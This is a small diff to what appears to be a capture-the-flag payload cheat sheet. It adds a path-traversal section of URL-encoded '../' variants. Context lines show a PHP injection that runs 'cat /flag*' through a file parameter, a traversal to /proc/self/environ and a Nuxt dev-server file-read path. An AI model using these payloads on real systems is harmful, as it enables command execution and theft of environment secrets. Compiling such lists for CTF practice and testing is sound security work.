@@ -14,6 +14,11 @@
   - `?file='.system("cat /flag*").'`
   - `/../../../../../../proc/self/environ`
   - `/_nuxt/@fs/flag.txt`
+  
+### Path traversal
+  - `%2e%2e/` -> `../`
+  - `%2e%2e%2f` -> `../`
+  - `..%2f` -> `../`
 
 ### XSS
 
